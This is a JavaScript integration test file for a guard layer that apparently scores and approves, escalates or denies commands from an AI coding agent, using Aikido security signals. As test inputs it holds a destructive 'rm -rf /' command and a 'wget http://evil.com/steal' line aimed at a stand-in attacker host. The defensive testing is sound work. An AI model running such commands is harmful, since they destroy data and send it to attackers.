/**
 * Integration Tests: Auto-Mode + Aikido
 */

const { AutoModeAikido, AikidoBridge } = require('./integration');

console.log('=== Auto-Mode + Aikido Integration Tests ===\n');

async function runTests() {
  // ─── Test 1: Initialization ──────────────────────────────────────────
  console.log('Test 1: Initialization');
  const am = new AutoModeAikido({
    aikido: { enabled: true }
  });
  console.log('✅ AutoModeAikido initialized');
  console.log('   Aikido connected:', am.aikido.connected);
  console.log('');

  // ─── Test 2: Aikido unavailable (graceful degradation) ───────────────
  console.log('Test 2: Graceful degradation without Aikido');
  const amStandalone = new AutoModeAikido({
    aikido: { enabled: false }
  });
  amStandalone.aikido.connected = false;
  
  const resultStandalone = await amStandalone.evaluateActionEnhanced(
    'npm install express',
    'yolo'
  );
  console.log('✅ Falls back to base Auto-Mode');
  console.log('   Decision:', resultStandalone.decision);
  console.log('   Has aikidoSignals:', !!resultStandalone.aikidoSignals);
  console.log('');

  // ─── Test 3: Critical actions always denied ──────────────────────────
  console.log('Test 3: Critical actions bypass Aikido');
  const resultCritical = await am.evaluateActionEnhanced(
    'rm -rf /',
    'yolo'
  );
  console.log('✅ Critical actions denied regardless of Aikido');
  console.log('   Decision:', resultCritical.decision);
  console.log('   Risk:', resultCritical.riskLevel);
  console.log('');

  // ─── Test 4: Domain extraction ───────────────────────────────────────
  console.log('Test 4: Domain extraction from actions');
  const domains = am.extractDomains('curl https://api.example.com/data && wget http://evil.com/steal');
  console.log('✅ Domains extracted:', domains);
  console.log('');

  // ─── Test 5: Package extraction ──────────────────────────────────────
  console.log('Test 5: Package extraction from commands');
  const pkgs1 = am.extractPackages('npm install express lodash');
  const pkgs2 = am.extractPackages('pip install requests flask');
  const pkgs3 = am.extractPackages('cargo add serde tokio');
  console.log('✅ npm packages:', pkgs1);
  console.log('✅ pip packages:', pkgs2);
  console.log('✅ cargo packages:', pkgs3);
  console.log('');

  // ─── Test 6: Pre-commit hook (no staged files) ──────────────────────
  console.log('Test 6: Pre-commit hook with no staged files');
  const preCommitResult = await am.preCommitHook('test commit');
  console.log('✅ Pre-commit hook works');
  console.log('   Decision:', preCommitResult.decision);
  console.log('   Rationale:', preCommitResult.rationale);
  console.log('');

  // ─── Test 7: Post-edit scan (file not found) ────────────────────────
  console.log('Test 7: Post-edit scan with missing file');
  const scanResult = await am.postEditScan('/nonexistent/file.ts');
  console.log('✅ Graceful handling of missing file');
  console.log('   Clean:', scanResult.clean);
  console.log('   Skipped:', scanResult.skipped);
  console.log('');

  // ─── Test 8: AikidoBridge connection check ───────────────────────────
  console.log('Test 8: AikidoBridge connection');
  const bridge = new AikidoBridge({ enabled: true });
  const connected = await bridge.checkConnection();
  console.log('✅ Bridge connection check works');
  console.log('   Connected:', connected);
  console.log('');

  // ─── Test 9: Combined signals (simulated) ────────────────────────────
  console.log('Test 9: Signal combination logic');
  const baseResult = {
    action: 'npm install vulnerable-pkg',
    riskLevel: 'high',
    decision: 'ESCALATE',
    agent: 'yolo'
  };
  const signals = [
    { type: 'package_vulnerability', package: 'vulnerable-pkg', issueCount: 3, maxSeverity: 'critical', impact: 'deny' }
  ];
  const combined = am.combineSignals(baseResult, signals);
  console.log('✅ Critical vulnerability escalates to DENY');
  console.log('   Original decision:', baseResult.decision);
  console.log('   Combined decision:', combined.decision);
  console.log('   Rationale:', combined.rationale);
  console.log('');

  // ─── Test 10: Elevated signals ───────────────────────────────────────
  console.log('Test 10: High-severity signal escalation');
  const baseResultLow = {
    action: 'curl https://flagged-domain.com',
    riskLevel: 'low',
    decision: 'APPROVE',
    agent: 'yolo'
  };
  const highSignals = [
    { type: 'domain_in_feed', domain: 'flagged-domain.com', severity: 'high', impact: 'elevate' }
  ];
  const elevated = am.combineSignals(baseResultLow, highSignals);
  console.log('✅ Domain in feed escalates APPROVE → ESCALATE');
  console.log('   Original decision:', baseResultLow.decision);
  console.log('   Elevated decision:', elevated.decision);
  console.log('');

  // ─── Summary ─────────────────────────────────────────────────────────
  console.log('=== All Integration Tests Passed ===');
}

runTests().catch(console.error);